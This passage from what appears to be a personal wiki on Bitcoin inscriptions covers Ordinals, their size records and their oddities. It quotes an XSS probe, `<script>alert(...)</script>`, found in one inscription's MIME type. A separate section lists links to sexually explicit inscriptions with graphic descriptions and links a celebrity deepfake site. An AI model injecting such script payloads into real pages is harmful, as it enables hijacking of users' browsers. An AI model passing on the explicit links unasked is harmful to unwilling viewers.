[A Quantitative Analysis of the Impact of Arbitrary Blockchain Content on Bitcoin](cryptocurrency.md#a-quantitative-analysis-of-the-impact-of-arbitrary-blockchain-content-on-bitcoin) gives the interesting insight that all its transactions seem to return change/fees to one or two given addresses, thus making it very easy to list all their uploads if they were consistent! So all we need are some starting points, which we have mostly due to ASCII mentions of the site on known inscriptions, all of which have a few common spent addresses at the very end:<a id="_643"></a>

<a id="_644"></a>
- 4c903a377addab7c1e35a685d3dabc664199e406374b1e5ce2fc59e78fb5b754: [1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS](cryptocurrency.md#1mvpqja7ftcdrwkc6zatkzvzcxqma4jixs)
<a id="_645"></a>
- 87aad85c6cd75a516789f364637d243c668e3424d031ae510e43c6edfe6ed206: [1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS](cryptocurrency.md#1mvpqja7ftcdrwkc6zatkzvzcxqma4jixs)
<a id="_646"></a>
- c206e8fff656f07b27dac831ef9b956792bae4e76a2cb43f14f49f0298bf2c2f: [1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS](cryptocurrency.md#1mvpqja7ftcdrwkc6zatkzvzcxqma4jixs)
<a id="_647"></a>
- ca4f11131eca6b4d61daf707a470cfccd1ef3d80a6f8b70f1f07616b451ca64e: [1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS](cryptocurrency.md#1mvpqja7ftcdrwkc6zatkzvzcxqma4jixs)
so we just have to solve [get all Bitcoin transactions from and to a given address](cryptocurrency.md#get-all-bitcoin-transactions-from-and-to-a-given-address) and we are done. [Blockchair](cryptocurrency.md#blockchair) shows about 800 entries as of February 2024, between 4f94f97eb156b8563a213bb292314a0bd9c95b39afc521fc5965d050daab2a78 (2014-03-02) and ac5f4ea03597b43a72fb8ab42bd5384629f87f4f4abc534f38b8c15148ccaf9f (2017-10-12): [https://blockchair.com/bitcoin/outputs?s=time(desc)&q=recipient(1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS)](https://blockchair.com/bitcoin/outputs?s=time(desc)&q=recipient(1MVpQJA7FtcDrwKC6zATkZvZcxqma4JixS))

<a id="_648"></a>
Other related transactions:<a id="_649"></a>

<a id="_650"></a>
- [tx 87aad85c6cd75a516789f364637d243c668e3424d031ae510e43c6edfe6ed206](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0474.txt#L3990) block 474652 (2017-07-07) via [cryptograffiti.info](#cryptograffiti-info) the default [pandoc](computer.md#pandoc) [markdown](computer.md#markdown) [https://pandoc.org/try](https://pandoc.org/try) markdown tutorial string! First, unseen in our ASCII dumps due to [UTF-8](telecommunication.md#utf-8) encoding::<a id="_651"></a>

  ```
  Unicode test: `Ä Ö Õ Ü ä ö õ ü`.
  ```

  followed by:<a id="_652"></a>

  ```
  An h1 header
  ============

  Paragraphs are separated by a blank line.
  ```

  And if ends with:<a id="_653"></a>

  ```
  Uploaded from http://cryptograffiti.info to demonstrate Markdown rendering.
  ```

<a id="_654"></a>
TODO understand what these are:<a id="_655"></a>

<a id="_656"></a>
- ae92dc4c31943955ad6e3e45a4eb0067f488fdd9aecca65c946460dd2a85488d
<a id="_657"></a>
- 3020dbd7c850bf8c19ebacf670a2830fe50999a8b2560a202af21d536760eea4
<a id="_658"></a>
- d65384a21cb1c327cc42416a0b1e2a78ad0296cb7a15312bdcd67ef169ecb309
<a id="_659"></a>
- a3e3100d2b9a86e310430945c001df97a70626220a9e151208aecbb613f1f152
<a id="_660"></a>
- a9c82ebc47fabd1eed7eeea7760d0a3c99288af3c3a17e396ec790fc280698a2
<a id="_661"></a>
- 92bfd5c0fb0f24efa6ca568c4475f44e94dfc8d0d4d5da04dfafc6261bf17f45
<a id="_662"></a>
- 73c22adb21b93f9220d00d2614a50350824be95b8ea966349e6f35fe5ac5537b
<a id="_663"></a>
- 099c0fd06d18953c886121ff143ea0a20d0baf29999f424fa1ac707a81cf4987
<a id="_664"></a>
- 3ad6677303fb6f700a4f2f977fe86e5324e0ddb0d3b33a649e513d7e88904e85
<a id="_665"></a>
- 31a2ddaf4b146e021246e1f82e28121f5c9c8729620978309004515c7e559910
<a id="_666"></a>
- adaae897fd286aefb64a69e88a53e9af17ee98611ea595c3c92d038f3274d723
<a id="_667"></a>
- d8bf48e9ad3de62c695ff34a96e340912bd62e0a0282b94da6386b837c31a30d

#### Ordinal ruleset inscription

↑ **Parent:** [Images](#images)

<a id="_670"></a>
Ordinals are inscriptions created with the protocol described at: [https://docs.ordinals.com/inscriptions.html](https://docs.ordinals.com/inscriptions.html) The protocol was designed by developer Casey Rodarmor, and shares a few similarities with the [AtomSea & EMBII](#atomsea-and-embii) protocol.

<a id="_671"></a>
The protocol also includes a way to have ownership over inscriptions, effectively creating an [NFT](cryptocurrency.md#non-fungible-token) system on top of the bitcoin blockchain. [AtomSea & EMBII](#atomsea-and-embii) also already had such a system however. In either case, [Ciro Santilli](ciro-santilli.md) couldn't give less of a fuck about who owns some random publicly viewable digital asset.

<a id="_672"></a>
For whatever reason, orinals became extremelly popular compared to the [AtomSea & EMBII](#atomsea-and-embii) format, leading to millions os inscriptions, and 10k+ images as of block 830k. They also started to take up a substatial portion of the available block space.

<a id="_673"></a>
This in turn led to a lot of [child porn](art.md#child-pornography) rediscussion, and people linking back to this page to view earlier inscriptions: [incoming links](#incoming-links).<a id="_674"></a>

<a id="_675"></a>
- [https://www.reddit.com/r/Buttcoin/comments/10rbkas/ordinals_nft_was_used_to_store_terrible_porn/](https://www.reddit.com/r/Buttcoin/comments/10rbkas/ordinals_nft_was_used_to_store_terrible_porn/)

<a id="_676"></a>
Unfortunately, unlike [AtomSea & EMBII](#atomsea-and-embii) and even [cryptograffiti.info](#cryptograffiti-info) uploads, most ordinals are designed to be just [souless bulk collectibles](#ordinal-ruleset-inscription-collection), as with as much artistic merit as any random collectible card set or postage stamps you may find at a newpaper stall. To make things worse many of them are likely algorithmically generated. [Eternal September](website.md#eternal-september) had truly arrived to the [Bitcoin blockchain](cryptocurrency.md#bitcoin). As a result, [machine learning](machine-learning.md) would be almost essential in order to find interesting uploads amidst such bulk.

<a id="_677"></a>
The source code for the reference uploader and indexer is at: [https://github.com/ordinals/ord](https://github.com/ordinals/ord)

<a id="_678"></a>
The reference viewer server for the runs at: [ordinals.com](#ordinals-com).

<a id="image-ordinal-0"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/6fb976ab49dcec017f1e201e84395983204ae1a7c2abf7ced0a85d692e442799-0.png)

**[Figure 83](#image-ordinal-0). Ordinal \#0**. This is the first [ordinal ruleset inscription](#ordinal-ruleset-inscription): [https://ordinals.com/inscription/6fb976ab49dcec017f1e201e84395983204ae1a7c2abf7ced0a85d692e442799i0](https://ordinals.com/inscription/6fb976ab49dcec017f1e201e84395983204ae1a7c2abf7ced0a85d692e442799i0). It was made on block 767430 ([2022-12-14](https://www.blockchain.com/explorer/blocks/btc/767430)).

<a id="_679"></a>
The `i0` at the end of the URL above means "inscription 0". This is because a single transaction can have multiple inscriptions.

<a id="_680"></a>
Some of them have sold for high prices. [Magic Eden](cryptocurrency.md#magic-eden) is a popular interface for trading them:<a id="_681"></a>

<a id="_682"></a>
- <a id="_683"></a>
  2023-12-08: \#8 was sold dor 10.4 BTC[https://cryptopotato.com/this-bitcoin-ordinals-inscription-was-sold-for-the-highest-price-ever/](https://cryptopotato.com/this-bitcoin-ordinals-inscription-was-sold-for-the-highest-price-ever/) (~$450,000 at the time)

  <a id="image-ordinal-8"></a>
  ![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/d95c0fb86bc0f0dce6a732c5ab77d47e33ed24099bdb01133f768cef75a47724-0.png)

  **[Figure 84](#image-ordinal-8). Ordinal \#8**. On [ordinals.com](#ordinals-com): [https://ordinals.com/inscription/d95c0fb86bc0f0dce6a732c5ab77d47e33ed24099bdb01133f768cef75a47724i0](https://ordinals.com/inscription/d95c0fb86bc0f0dce6a732c5ab77d47e33ed24099bdb01133f768cef75a47724i0)

<a id="_684"></a>
The ordinals also started taking up large portions of the Bitcoin blockchain:<a id="_685"></a>

<a id="_686"></a>
- [https://dune.com/dataalways/ordinals](https://dune.com/dataalways/ordinals)
<a id="_687"></a>
- [https://research.aimultiple.com/bitcoins-block-space/](https://research.aimultiple.com/bitcoins-block-space/)

<a id="_688"></a>
Apparently the "Taproot" Bitcoin update made it easier to upload image-sized data once again, which had become prohibitively expensive 2023 and much earlier:<a id="_689"></a>

<a id="_690"></a>
- [https://protos.com/did-taproot-ruin-bitcoin-with-nft-inscriptions-of-monkey-jpegs/](https://protos.com/did-taproot-ruin-bitcoin-with-nft-inscriptions-of-monkey-jpegs/)
<a id="_691"></a>
- [https://ordinals.com/](https://ordinals.com/) appears to index some types of ordinals

<a id="_692"></a>
Bibliography:<a id="_693"></a>

<a id="_694"></a>
- [https://blocktelegraph.io/parent-child-bitcoin-inscriptions/](https://blocktelegraph.io/parent-child-bitcoin-inscriptions/) parent-child relationshipsi are possible between two ordinals
<a id="_695"></a>
- [https://ordinals.com/](https://ordinals.com/)
<a id="_696"></a>
- [https://bitcoin.stackexchange.com/questions/117018/understanding-how-ordinals-work-with-the-bitcoin-blockchain-what-is-exactly-sto](https://bitcoin.stackexchange.com/questions/117018/understanding-how-ordinals-work-with-the-bitcoin-blockchain-what-is-exactly-sto)
<a id="_697"></a>
- [https://bitcoin.stackexchange.com/questions/118405/read-ordinal-transaction-data](https://bitcoin.stackexchange.com/questions/118405/read-ordinal-transaction-data)
<a id="_698"></a>
- [https://bitcoin.stackexchange.com/questions/118247/can-someone-explain-the-byte-composition-of-an-inscription-reveal-transaction](https://bitcoin.stackexchange.com/questions/118247/can-someone-explain-the-byte-composition-of-an-inscription-reveal-transaction)
<a id="_699"></a>
- [https://nftnow.com/guides/bitcoin-nfts-most-notable-ordinals-inscriptions/](https://nftnow.com/guides/bitcoin-nfts-most-notable-ordinals-inscriptions/)

<h5 id="ordinals-com">ordinals.com</h5>

↑ **Parent:** [Ordinal ruleset inscription](#ordinal-ruleset-inscription)

<a id="_700"></a>
Reference indexer web interface implementation of [ordinal ruleset inscriptions](#ordinal-ruleset-inscription).

<a id="_701"></a>
Source code presumably at: [https://github.com/ordinals/ord](https://github.com/ordinals/ord)

<a id="_702"></a>
Viewing tip: plaintext inscriptions and some HTML pages don't show well on the preview window, but you can view them well by clicking on "content". E.g.:<a id="_703"></a>

<a id="_704"></a>
- [https://ordinals.com/inscription/7b0a0b9f18a729e905822304f9c4c05f8851d10bdc82efa902fd936ef874efebi0](https://ordinals.com/inscription/7b0a0b9f18a729e905822304f9c4c05f8851d10bdc82efa902fd936ef874efebi0) unreadable preview
<a id="_705"></a>
- [https://ordinals.com/content/7b0a0b9f18a729e905822304f9c4c05f8851d10bdc82efa902fd936ef874efebi0](https://ordinals.com/content/7b0a0b9f18a729e905822304f9c4c05f8851d10bdc82efa902fd936ef874efebi0) perfectly readable plaintext

##### Ordinal ruleset inscription porn

↑ **Parent:** [Ordinal ruleset inscription](#ordinal-ruleset-inscription)  
🏷️ **Tags:** [Porn](#porn)

<a id="_707"></a>
These were found by running [object detection software for some porn/nudity detection](machine-learning.md#porn-image-detection). We need to run some more, all [sex](biology.md#sexual-intercourse) was likely missed: [https://github.com/GantMan/nsfw_model/issues/160](https://github.com/GantMan/nsfw_model/issues/160)

<a id="_708"></a>
[Vagina](biology.md#vagina):<a id="_709"></a>

<a id="_710"></a>
- [https://ordinals.com/inscription/723d753d975cbae01b76fb09d827246ef023a46a408c6c452d22d63a6fed9e72i0](https://ordinals.com/inscription/723d753d975cbae01b76fb09d827246ef023a46a408c6c452d22d63a6fed9e72i0) shaved closeup
<a id="_711"></a>
- [https://ordinals.com/inscription/7462bf4f967633efaaadf136c03bc2ad784941563330b593022d68a7c3460641i0](https://ordinals.com/inscription/7462bf4f967633efaaadf136c03bc2ad784941563330b593022d68a7c3460641i0) shaved from the front
<a id="_712"></a>
- [https://ordinals.com/inscription/8e92eb73fa2d0aa951cb860db29107f02d5c439e97254cde87679bb23fea9d27i0](https://ordinals.com/inscription/8e92eb73fa2d0aa951cb860db29107f02d5c439e97254cde87679bb23fea9d27i0) stretch from the back

<a id="_713"></a>
[Dick](biology.md#penis) photos:<a id="_714"></a>

<a id="_715"></a>
- [https://ordinals.com/inscription/3979478c4b9d0e008344cb7274b10ad9f5ea4d04604c97efc56909b825808d18i0](https://ordinals.com/inscription/3979478c4b9d0e008344cb7274b10ad9f5ea4d04604c97efc56909b825808d18i0) big white dick
<a id="_716"></a>
- [https://ordinals.com/inscription/8ae58911078f7aa0dfce457355498abc1a5bdd57f5b05525419466064c3e89c3i0](https://ordinals.com/inscription/8ae58911078f7aa0dfce457355498abc1a5bdd57f5b05525419466064c3e89c3i0) big-ish white dick small blonde guy. Likely [gay porn](art.md#gay-porn).
<a id="_717"></a>
- [https://ordinals.com/inscription/dfb4213ac5a26d581cf6b6516bc8726e699ac632f0722c97eb48cfbe6b1e3eb6i0](https://ordinals.com/inscription/dfb4213ac5a26d581cf6b6516bc8726e699ac632f0722c97eb48cfbe6b1e3eb6i0) hard dick
<a id="_718"></a>
- big black dick Bitcoin memes<a id="_719"></a>

  <a id="_720"></a>
  - [https://ordinals.com/inscription/0e88455154f74ebd4b12ff3f7c73dbf8327218c3fe6e60180e294dcb354e35f1i0](https://ordinals.com/inscription/0e88455154f74ebd4b12ff3f7c73dbf8327218c3fe6e60180e294dcb354e35f1i0) how BTC feels RN (right now)
  <a id="_721"></a>
  - [https://ordinals.com/inscription/997f06f98f02bf7102ec5a18375d7fe57dd797cf230895566252feb4d32583e8i0](https://ordinals.com/inscription/997f06f98f02bf7102ec5a18375d7fe57dd797cf230895566252feb4d32583e8i0) bitcoin bit dick again

<a id="_722"></a>
[Anus](taxonomy.md#anus):<a id="_723"></a>

<a id="_724"></a>
- \#668 [https://ordinals.com/inscription/bb6f577e30e6840dce0474f3c3c55134404688e844982a49161502d3d69e322di0](https://ordinals.com/inscription/bb6f577e30e6840dce0474f3c3c55134404688e844982a49161502d3d69e322di0) male asshole open shock porn, this realtively early inscription got some attention:<a id="_725"></a>

  <a id="_726"></a>
  - [https://cointelegraph.com/news/bitcoin-ordinals-creators-look-for-fix-after-first-instance-of-shock-porn](https://cointelegraph.com/news/bitcoin-ordinals-creators-look-for-fix-after-first-instance-of-shock-porn)
  <a id="_727"></a>
  - [https://www.reddit.com/r/Buttcoin/comments/10rbkas/ordinals_nft_was_used_to_store_terrible_porn/](https://www.reddit.com/r/Buttcoin/comments/10rbkas/ordinals_nft_was_used_to_store_terrible_porn/)

  It happened soon after the notable [Figure 85. "Ordinal \#652"](#image-ordinal-652), and it likely tried to follow the surge of interest from its predecessor.
<a id="_728"></a>
- [https://ordinals.com/inscription/31d03361ca6bf998e0623763a87d2f776b33a50504bc3a9bbf128e96d97418b9i0](https://ordinals.com/inscription/31d03361ca6bf998e0623763a87d2f776b33a50504bc3a9bbf128e96d97418b9i0) female open blackhole

<a id="_729"></a>
[Boobs](biology.md#breast):<a id="_730"></a>

<a id="_731"></a>
- [https://ordinals.com/inscription/f3bec476ee82bca5ba5a36e64846efde6d73ba9af8ccc8afa0866e2b756a171ei0](https://ordinals.com/inscription/f3bec476ee82bca5ba5a36e64846efde6d73ba9af8ccc8afa0866e2b756a171ei0) seedspiller [https://cfake.com/](https://cfake.com/) celebrity [deepfake](machine-learning.md#deepfake) [website](website.md)

<a id="_732"></a>
Lingerie:<a id="_733"></a>

<a id="_734"></a>
- bitcoinlambos.eth ads<a id="_735"></a>

  <a id="_736"></a>
  - [https://ordinals.com/inscription/a223c05804fcd6ee10a331021386ff8f9d962478abc50bdb4682f813df23db3fi0](https://ordinals.com/inscription/a223c05804fcd6ee10a331021386ff8f9d962478abc50bdb4682f813df23db3fi0)
  <a id="_737"></a>
  - [https://ordinals.com/inscription/84d7acc1c5fc516bb215bf9f58096b3863916a2035282cff6ba5a60ffbb90813i0](https://ordinals.com/inscription/84d7acc1c5fc516bb215bf9f58096b3863916a2035282cff6ba5a60ffbb90813i0)
  <a id="_738"></a>
  - [https://ordinals.com/inscription/e20fedb0d106832c71c5af06fdf2483b9256229260ac64dc26b28271871079a0i0](https://ordinals.com/inscription/e20fedb0d106832c71c5af06fdf2483b9256229260ac64dc26b28271871079a0i0)
<a id="_739"></a>
- [GenAI](artificial-intelligence.md#generative-ai) blondes in lingerie:<a id="_740"></a>

  <a id="_741"></a>
  - [https://ordinals.com/inscription/7e8de04f48f727a26a9b88a62ac59076340c3c5106f0f6988d539f92274078e8i0](https://ordinals.com/inscription/7e8de04f48f727a26a9b88a62ac59076340c3c5106f0f6988d539f92274078e8i0)
  <a id="_742"></a>
  - [https://ordinals.com/inscription/15b6c717406d40f9beca4d4eb8bcdb239c48e6ee5e551d55a0b77da3f7e98894i0](https://ordinals.com/inscription/15b6c717406d40f9beca4d4eb8bcdb239c48e6ee5e551d55a0b77da3f7e98894i0)<a id="_743"></a>

    <a id="_744"></a>
    - [https://ordinals.com/inscription/ba401ed7fbfa4d72439465428a8c37e46efa59ccd7c5105dce4564f2d6a1a8f5i0](https://ordinals.com/inscription/ba401ed7fbfa4d72439465428a8c37e46efa59ccd7c5105dce4564f2d6a1a8f5i0) same as above
  <a id="_745"></a>
  - [https://ordinals.com/inscription/4a83d90c51a4a72d3657449682c31d24c4ece5cc9d33b8d83c2ec82cbe05b124i0](https://ordinals.com/inscription/4a83d90c51a4a72d3657449682c31d24c4ece5cc9d33b8d83c2ec82cbe05b124i0)
<a id="_746"></a>
- [https://ordinals.com/inscription/41250e039f9f1fdf9a05a3775d1a94a35bb46481a66687570f5db98ab7d00501i0](https://ordinals.com/inscription/41250e039f9f1fdf9a05a3775d1a94a35bb46481a66687570f5db98ab7d00501i0) serious white bikini
<a id="_747"></a>
- [https://ordinals.com/inscription/bc361a8978e309d3c5b4212f35c48c74396315ee4c10a7e2f17427264d3178c6i0](https://ordinals.com/inscription/bc361a8978e309d3c5b4212f35c48c74396315ee4c10a7e2f17427264d3178c6i0) Jenna Jameson 80's style photo shoot at at the beach. More at [https://www.forumophilia.com/topic462690.html](https://www.forumophilia.com/topic462690.html).
<a id="_748"></a>
- [https://ordinals.com/inscription/647b0cafe5a6fc545e40b6c1bab910c43adfe6b372fee0cc65d0aef9e470d820i0](https://ordinals.com/inscription/647b0cafe5a6fc545e40b6c1bab910c43adfe6b372fee0cc65d0aef9e470d820i0) [Bitcoin](cryptocurrency.md#bitcoin) carnival dress? What are the fruits behind and what is written in the back?

<a id="_749"></a>
Sexy illustrations:<a id="_750"></a>

<a id="_751"></a>
- [https://ordinals.com/inscription/beeff78be2939caa9491b7588a6c3822b40b7e00d74190db1838ae9e0845b761i0](https://ordinals.com/inscription/beeff78be2939caa9491b7588a6c3822b40b7e00d74190db1838ae9e0845b761i0) [The Source by Jean-Auguste-Dominique Ingres](https://en.wikipedia.org/wiki/The_Source_(Ingres)) (1856). Classical painting woman with pot.
<a id="_752"></a>
- [https://ordinals.com/inscription/890fc1226d6ac2dbcd54c8a9292581b903c2ab85f1eec8a0b0951bb32f88a173i0](https://ordinals.com/inscription/890fc1226d6ac2dbcd54c8a9292581b903c2ab85f1eec8a0b0951bb32f88a173i0) genai cartoon futuristic big boobs
<a id="_753"></a>
- [https://ordinals.com/inscription/343699e12e3239357f42eab428a60591b9a40599ce57dfffe29709ed103f426di0](https://ordinals.com/inscription/343699e12e3239357f42eab428a60591b9a40599ce57dfffe29709ed103f426di0) vagina apples
<a id="_754"></a>
- [https://ordinals.com/inscription/3bc21aa658a36c4e26a1c2631ac280e101d7167ee3fa19debadeb44cff0a9535i0](https://ordinals.com/inscription/3bc21aa658a36c4e26a1c2631ac280e101d7167ee3fa19debadeb44cff0a9535i0) sexy drawing in lingerie
<a id="_755"></a>
- [https://ordinals.com/inscription/1a30aef623eac0dad6fc6759dc7c963266cda44ce43cece420bc41a07734b3cdi0](https://ordinals.com/inscription/1a30aef623eac0dad6fc6759dc7c963266cda44ce43cece420bc41a07734b3cdi0) bikini selife onlyfans
<a id="_756"></a>
- The "Astral Babes" [Ordinal ruleset inscription collection](#ordinal-ruleset-inscription-collection) [https://magiceden.io/ordinals/marketplace/astral-babes](https://magiceden.io/ordinals/marketplace/astral-babes) hits positive for [breasts](biology.md#breast) and is a pain in the butt:<a id="_757"></a>

  <a id="_758"></a>
  - [https://ordinals.com/inscription/bd1705c52b601ab93b7e82c07477fed89568e3ebd4719ddf41d73c8be57c2d65i0](https://ordinals.com/inscription/bd1705c52b601ab93b7e82c07477fed89568e3ebd4719ddf41d73c8be57c2d65i0)
  <a id="_759"></a>
  - [https://ordinals.com/inscription/bd1705c52b601ab93b7e82c07477fed89568e3ebd4719ddf41d73c8be57c2d65i0](https://ordinals.com/inscription/bd1705c52b601ab93b7e82c07477fed89568e3ebd4719ddf41d73c8be57c2d65i0)
  <a id="_760"></a>
  - [https://ordinals.com/inscription/c7cd91355f7306c72d4d69f073f07f089689b7f790fb1c8595ac59eaed115af5i0](https://ordinals.com/inscription/c7cd91355f7306c72d4d69f073f07f089689b7f790fb1c8595ac59eaed115af5i0)
  <a id="_761"></a>
  - [https://ordinals.com/inscription/4322bcce78f05bb280337892954cce24948c9e0a90cb486c9734f90beae14811i0](https://ordinals.com/inscription/4322bcce78f05bb280337892954cce24948c9e0a90cb486c9734f90beae14811i0)

##### Technically interesting ordinal

↑ **Parent:** [Ordinal ruleset inscription](#ordinal-ruleset-inscription)

<a id="_762"></a>
This section is about ordinals that are interesting primarily due to technical reasons linked to edge cases of the protocol.

<a id="_763"></a>
Interesting MIME types:<a id="_764"></a>

<a id="_765"></a>
- [https://ordinals.com/inscription/dad86d722156b8c384c1f3243e40aa7a0f6f5be496bc24e19485831584f9803fi0](https://ordinals.com/inscription/dad86d722156b8c384c1f3243e40aa7a0f6f5be496bc24e19485831584f9803fi0): mime type is an UTF-8 orange emoji "🟠"
<a id="_766"></a>
- [https://ordinals.com/inscription/bc7b86245159cdf8bc63489687909f766a0a0e08279d23fb077cdd60ab1e9f22i0](https://ordinals.com/inscription/bc7b86245159cdf8bc63489687909f766a0a0e08279d23fb077cdd60ab1e9f22i0): mime type is an [XSS](software.md#cross-site-scripting) attempt:<a id="_767"></a>

  ```
  <script>alert('xss in content type')</script> tx=bc7b86245159cdf8bc63489687909f766a0a0e08279d23fb077cdd60ab1e9f22
  ```
<a id="_768"></a>
- [https://ordinals.com/inscription/bc7b86245159cdf8bc63489687909f766a0a0e08279d23fb077cdd60ab1e9f22i0](https://ordinals.com/inscription/bc7b86245159cdf8bc63489687909f766a0a0e08279d23fb077cdd60ab1e9f22i0): mime type is "FuckYou"
<a id="_769"></a>
- [https://ordinals.com/inscription/00b0ece72217ce49b637b3f9bf5335bc245e588568aa0676581b40c1bedc521di0](https://ordinals.com/inscription/00b0ece72217ce49b637b3f9bf5335bc245e588568aa0676581b40c1bedc521di0): the mime is a long [JSON](computer.md#json). However, it does appear to be a valid feature as it rendered specially on [ordinals.com](#ordinals-com).

<a id="_770"></a>
Different `ord` markers:<a id="_771"></a>

<a id="_772"></a>
- 71e85885522047240a9e70542145dbf2385e1bd468e6ac6002aa755422ea10f5 uses `takingnames`. Decode with:<a id="_773"></a>

  ```
  bitcoin-core.cli decodescript "$(bitcoin-core.cli getrawtransaction 71e85885522047240a9e70542145dbf2385e1bd468e6ac6002aa755422ea10f5 true | jq -r '.vin[0].txinwitness[1]')" | jq -r .asm | sed 's/.* 0 //;s/ OP_ENDIF//;s/ //g' | xxd -r -p > 71e85885522047240a9e70542145dbf2385e1bd468e6ac6002aa755422ea10f5.png
  ```

  gives the [PNG](computer.md#portable-network-graphics) of the wireframe draing of a washing machine with transparent background.

###### Largest ordinal inscription

↑ **Parent:** [Technically interesting ordinal](#technically-interesting-ordinal)

<a id="_774"></a>
We can get a list of the ordinals at: [https://archive.org/details/bitcoin-ordinal-inscriptions.csv](https://archive.org/details/bitcoin-ordinal-inscriptions.csv) and then sort them by payload size with:<a id="_775"></a>

```
sort -k6 -n -t, ordinals.csv -o ordinals-sort-size.csv
```

<a id="_776"></a>
This shows to us that as of block ~831k, there are 4 ordinals which are far far larger than any other between 3 MiB and 4 MiB, at about 10x larger than then 5th one d115a6e689086fd587e5032f24ba2a8c01f2f87cba758c9d5eb8cf7f6e9a816a

<a id="_777"></a>
In those cases, a single inscription takes almost the entire block, and the inscribers must have had direct dealings with their mining pool:<a id="_778"></a>

<a id="_779"></a>
- [https://ordinals.com/inscription/4af9047d8b4b6ffffaa5c74ee36d0506a6741ba6fc6b39fe20e4e08df799cf99i0](https://ordinals.com/inscription/4af9047d8b4b6ffffaa5c74ee36d0506a6741ba6fc6b39fe20e4e08df799cf99i0): 3,946,469 bytes (image/jpeg). [Bitcoin Magazine](https://ourbigbook.com/go/topic/bitcoin-magazine) cover showing the face of [Julian Assange](https://ourbigbook.com/go/topic/julian-assange). [tx 4af9047d8b4b6ffffaa5c74ee36d0506a6741ba6fc6b39fe20e4e08df799cf99](https://www.blockchain.com/explorer/transactions/btc/4af9047d8b4b6ffffaa5c74ee36d0506a6741ba6fc6b39fe20e4e08df799cf99) block 786501 (2023-04-22). Mined by [Terra Pool](https://ourbigbook.com/go/topic/terra-pool).
<a id="_780"></a>
- [https://ordinals.com/inscription/0301e0480b374b32851a9462db29dc19fe830a7f7d7a88b81612b9d42099c0aei0](https://ordinals.com/inscription/0301e0480b374b32851a9462db29dc19fe830a7f7d7a88b81612b9d42099c0aei0): 3,915,537 bytes (image/jpeg). [Taproot Wizards](#taproot-wizards) ad. This was apparently the largest block ever mined at the time: [https://www.reddit.com/r/Bitcoin/comments/10r6t1l/the_first_4_mb_block_in_bitcoin_history_mined_by/](https://www.reddit.com/r/Bitcoin/comments/10r6t1l/the_first_4_mb_block_in_bitcoin_history_mined_by/) and received some notice. [tx 0301e0480b374b32851a9462db29dc19fe830a7f7d7a88b81612b9d42099c0ae](https://www.blockchain.com/explorer/transactions/btc/0301e0480b374b32851a9462db29dc19fe830a7f7d7a88b81612b9d42099c0ae) block 774628 (2023-02-01). Mined by Luxor pool.<a id="image-ordinal-652"></a>
  ![](https://web.archive.org/web/20230511232827im_/https://ordinals.com/content/0301e0480b374b32851a9462db29dc19fe830a7f7d7a88b81612b9d42099c0aei0)

  **[Figure 85](#image-ordinal-652). Ordinal \#652**. [Source](https://ordinals.com/inscription/0301e0480b374b32851a9462db29dc19fe830a7f7d7a88b81612b9d42099c0aei0).
<a id="_781"></a>
- [https://ordinals.com/inscription/79b91e594c03c8f06d70c44a288a88a413c540abca007829ca119686a7f979dai0](https://ordinals.com/inscription/79b91e594c03c8f06d70c44a288a88a413c540abca007829ca119686a7f979dai0): 3,878,842 bytes (image/webp). "Bitcoin War Bonds". A spoof of something. No time to understand now. [tx 79b91e594c03c8f06d70c44a288a88a413c540abca007829ca119686a7f979da](https://www.blockchain.com/explorer/transactions/btc/79b91e594c03c8f06d70c44a288a88a413c540abca007829ca119686a7f979da) block 777945 (2023-02-23). Mined by [Terra Pool](https://ourbigbook.com/go/topic/terra-pool).
<a id="_782"></a>
- [https://ordinals.com/inscription/b5a7e05f28d00e4a791759ad7b6bd6799d856693293ceeaad9b0bb93c8851f7fi0](https://ordinals.com/inscription/b5a7e05f28d00e4a791759ad7b6bd6799d856693293ceeaad9b0bb93c8851f7fi0): 3,379,682 bytes (video/mp4). Short looping video of a "purple frog drinking from a glass with a straw". Yes you heard that right. TODO context? [tx b5a7e05f28d00e4a791759ad7b6bd6799d856693293ceeaad9b0bb93c8851f7f](https://www.blockchain.com/explorer/transactions/btc/b5a7e05f28d00e4a791759ad7b6bd6799d856693293ceeaad9b0bb93c8851f7f) block 776884 (2023-02-16 ) Despite being huge, this received very little attention, the only [Google](google.md) mention is at [An overview of recent non-standard Bitcoin transactions by 0xB10C](cryptocurrency.md#an-overview-of-recent-non-standard-bitcoin-transactions-by-0xb10c). Mined by [Terra Pool](https://ourbigbook.com/go/topic/terra-pool).

<a id="_783"></a>
As of 2024, all of the big ones were made in early 2023, so it seems that the trend has died down a bit.

###### Largest text ordinal inscription

↑ **Parent:** [Largest ordinal inscription](#largest-ordinal-inscription)

<a id="_784"></a>
Text is the only reasonbly interesting content that [Ciro Santilli](ciro-santilli.md) has seen in the ordinals, as opposed to images which are boring. They haven'g found a way to commercialize it yet it seems, thank God. Glad to have researcehd this a bit!

<a id="_785"></a>
Shame that the plaintext ones don't show up too well on [ordinals.com](#ordinals-com)!

<a id="_786"></a>
The largest inscriptions with mime `text/*` are:<a id="_787"></a>

<a id="_788"></a>
- [https://ordinals.com/inscription/e15e19c587985e7dbb0554a6b51df976fdc8d95f4350b759c10b07399d34a7bbi0](https://ordinals.com/inscription/e15e19c587985e7dbb0554a6b51df976fdc8d95f4350b759c10b07399d34a7bbi0): 395,253 bytes (2023-02-23): an English translation of Mein Kampf by [Adolf Hitler](continent.md#adolf-hitler) starting from the "Author's preface" section to the end of Chapter V. This seems to be the text: [https://gutenberg.net.au/ebooks02/0200601.txt](https://gutenberg.net.au/ebooks02/0200601.txt) [https://gutenberg.net.au/ebooks02/0200601.txt](https://gutenberg.net.au/ebooks02/0200601.txt). Likely someone trying to be naughty, on the same vein as the "[Hitler](continent.md#adolf-hitler) did nothing wrong" [meme](science.md#meme) from previous eras
<a id="_789"></a>
